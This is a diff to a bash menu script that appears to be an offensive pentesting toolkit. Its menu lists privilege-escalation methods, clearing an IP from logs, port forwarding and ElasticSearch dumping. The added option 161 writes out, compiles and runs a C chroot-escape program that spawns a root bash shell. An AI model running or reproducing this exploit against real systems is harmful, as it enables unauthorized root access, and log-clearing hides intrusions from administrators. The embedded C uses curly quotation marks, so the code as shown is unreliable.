@@ -98,7 +98,7 @@ while true; do
 	echo -ne " 27. PrivEsc with git\t\t\t\t\t28. PrivEsc with apt\t\t\t\t29. PrivEsc with cat\n"
 	echo -ne " 142. clear IP from logs\t\t\t\t143. socat port forward\t\t\t\t144. sudo -l\n"
 	echo -ne " 145. ElasticSearch dumping\t\t\t\t146. view lastlog\t\t\t\t147. view auth_log\n"
-	echo -ne " 148. view history\n"
+	echo -ne " 148. view history\t\t\t\t\t\t161. Privesc with chroot\n"
 	echo "WINRM"
 	echo -ne " 132. Alamot/code-snippets/winrm/\n"
 	echo "OTHERS"
@@ -574,6 +574,13 @@ while true; do
 	"160")
 		Scarica "DominicBreuker/pspy32s" "$ENTSSL""DominicBreuker/pspy/releases/download/v1.1.0/pspy32s" "pspy32s"
 	;;
+	"161")
+		echo -e "#include <sys/stat.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(void){\nmkdir(\“chroot-dir\”, 0755);\nchroot(\“chroot-dir\”);\nfor(int i = 0; i < 1000; i++){\nchdir(\“..\”);\n}\nchroot(\“.\”);\nsystem(\“/bin/bash\”);\n}" > root4.c
+		gcc root4.c -o root4
+		chmod +x root4
+		./root4
+		whoami
+	;; 
 	*)
 		echo "error, invalid choice"
 	;;
